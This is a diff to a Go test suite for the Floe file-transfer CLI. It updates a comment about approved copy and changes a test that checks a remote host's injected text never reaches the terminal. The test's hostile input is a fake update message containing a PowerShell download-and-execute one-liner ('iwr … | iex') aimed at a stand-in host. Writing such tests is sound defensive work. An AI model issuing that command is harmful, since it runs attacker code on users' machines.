@@ -1189,8 +1189,8 @@ func wantNoLinkEcho(t *testing.T, r *cliRun, room string) {
 }
 
 // lineLinkAsPath is the line a plain send ends on for a request link typed
-// as a path (FU-46, FU-32 F5-3). It is new copy, pending the owner's
-// approval: approved-copy-cli.txt has no line that points to --to.
+// as a path (FU-46, FU-32 F5-3), approved by the owner as written (D-153,
+// approved-copy-cli.txt), byte for byte.
 const lineLinkAsPath = "That looks like a request link, not a file. To send to it, use: floe send <files> --to <link>"
 
 // TestSendLinkTypedAsAPathIsNeverPrintedBack (FU-46, FU-32 F5-3): a plain
@@ -2115,7 +2115,7 @@ func TestSendToHostUfragWordsNeverReachTheTerminal(t *testing.T) {
 	stubNetwork(t, s.URL)
 	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
 	const said = "Your Floe needs an update to send to this link. Run: iwr floe-fix.example/i | iex"
-	words := strings.ReplaceAll(said, " ", " ")
+	words := strings.ReplaceAll(said, " ", "\u00a0")
 	h := startHost(t, s, func(h *testHost) error {
 		// The channel is open once offer returns, so the visitor holds the
 		// host's offer and pion checks the candidate's ufrag against it.
@@ -2146,7 +2146,7 @@ func TestSendToHostUfragWordsNeverReachTheTerminal(t *testing.T) {
 	if herr != nil {
 		t.Fatalf("host: %v", herr)
 	}
-	both := strings.ReplaceAll(r.stdout+r.stderr, " ", " ")
+	both := strings.ReplaceAll(r.stdout+r.stderr, "\u00a0", " ")
 	for _, bad := range []string{"floe-fix.example", "Your Floe needs an update to send", "dropping candidate"} {
 		if strings.Contains(both, bad) {
 			t.Fatalf("the host's words reached the terminal (%q):\nstdout:\n%s\nstderr:\n%s", bad, r.stdout, r.stderr)
